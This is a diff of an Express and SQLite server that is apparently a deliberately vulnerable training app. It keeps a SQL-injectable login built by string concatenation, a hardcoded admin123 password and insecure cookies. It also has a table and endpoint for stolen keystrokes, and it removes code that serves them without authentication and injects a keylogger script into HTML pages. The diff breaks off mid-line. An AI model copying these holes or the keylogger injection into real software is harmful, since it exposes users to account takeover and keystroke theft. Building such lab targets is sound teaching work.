@@ -23,7 +23,8 @@ app.use(
     saveUninitialized: true,
     cookie: {
       secure: false,
-      httpOnly: false
+      httpOnly: false,
+      maxAge: 1000 * 60 * 60 // 1 hour
     }
   })
 );
@@ -34,6 +35,7 @@ const db = new sqlite3.Database(dbPath, (err) => {
   } else {
     console.log(`Connected to the SQLite database at \${dbPath}.`);
 
+    // 1. Users Table
     db.run(
       `CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -41,29 +43,22 @@ const db = new sqlite3.Database(dbPath, (err) => {
         password TEXT
       )`,
       (err) => {
-        if (err) {
-          console.error('Error creating users table', err.message);
-        } else {
+        if (err) console.error('Error creating users table', err.message);
+        else {
           console.log('Users table ready.');
-
-          // ✅ Always reset password to admin123 on every deploy
           db.run(
-            `INSERT INTO users (username, password)
-             VALUES (?, ?)
-             ON CONFLICT(username) DO UPDATE SET password = excluded.password`,
+            `INSERT INTO users (username, password) VALUES (?, ?) ON CONFLICT(username) DO UPDATE SET password = excluded.password`,
             ['admin', 'admin123'],
             (err) => {
-              if (err) {
-                console.error('Error seeding admin user', err.message);
-              } else {
-                console.log('Admin user seeded with password: admin123');
-              }
+              if (err) console.error('Error seeding admin user', err.message);
+              else console.log('Admin user seeded with password: admin123');
             }
           );
         }
       }
     );
 
+    // 2. Employees Table
     db.run(
       `CREATE TABLE IF NOT EXISTS employees (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -73,11 +68,9 @@ const db = new sqlite3.Database(dbPath, (err) => {
         salary REAL
       )`,
       (err) => {
-        if (err) {
-          console.error('Error creating employees table', err.message);
-        } else {
+        if (err) console.error('Error creating employees table', err.message);
+        else {
           console.log('Employees table ready.');
-
           db.all('PRAGMA table_info(employees)', (err, columns) => {
             if (err) return;
             const columnNames = columns.map((c) => c.name);
@@ -105,7 +98,7 @@ const db = new sqlite3.Database(dbPath, (err) => {
       }
     );
 
-    // ⚠️ VULNERABILITY: Create table to store keystrokes
+    // 3. KEYS TABLE: To store the stolen keystrokes
     db.run(
       `CREATE TABLE IF NOT EXISTS keystrokes (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -114,11 +107,8 @@ const db = new sqlite3.Database(dbPath, (err) => {
         timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
       )`,
       (err) => {
-        if (err) {
-          console.error('Error creating keystrokes table', err.message);
-        } else {
-          console.log('Keystrokes table ready.');
-        }
+        if (err) console.error('Error creating keystrokes table', err.message);
+        else console.log('Keystrokes table ready.');
       }
     );
   }
@@ -127,21 +117,14 @@ const db = new sqlite3.Database(dbPath, (err) => {
 // ⚠️ DELIBERATELY VULNERABLE — SQL Injection possible here
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
-
-  // Raw string concatenation — no parameterization
   const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
 
   db.get(query, (err, user) => {
-    if (err) {
-      // Return the error — helps sqlmap fingerprint the DB
-      return res.status(500).json({ success: false, error: err.message });
-    }
-
+    if (err) return res.status(500).json({ success: false, error: err.message });
     if (user) {
       req.session.user = user.username;
       return res.json({ success: true, message: 'Logged in successfully!', user: user.username });
     }
-
     res.status(401).json({ success: false, error: 'Invalid credentials' });
   });
 });
@@ -218,33 +201,4 @@ app.post('/api/log', (req, res) => {
     function (err) {
       if (err) {
         console.error('Error logging keystroke:', err.message);
-        return res.status(500).json({ error: 'Failed to log keystroke' });
-      }
-      res.status(201).json({ success: true, id: this.lastID });
-    }
-  );
-});
-
-// ⚠️ VULNERABILITY: Endpoint to retrieve all keystrokes (no authentication)
-app.get('/api/keystrokes', (req, res) => {
-  db.all('SELECT * FROM keystrokes ORDER BY timestamp DESC', [], (err, rows) => {
-    if (err) {
-      console.error('Error retrieving keystrokes:', err.message);
-      return res.status(500).json({ error: 'Database error' });
-    }
-    res.json({ success: true, count: rows.length, data: rows });
-  });
-});
-
-// ⚠️ VULNERABILITY: Inject keylogger script into static pages
-app.use(express.static(path.join(__dirname, 'dist')));
-
-app.use((req, res, next) => {
-  if (req.path.endsWith('.js')) {
-    // Don't inject into JS files
-    return next();
-  }
-  
-  // Check if this is a request for an HTML file
-  if (req.path.endsWith('.html') || req.path === '/') {
-    const filePath = path.join
+        return res.status(500).json({ error: '
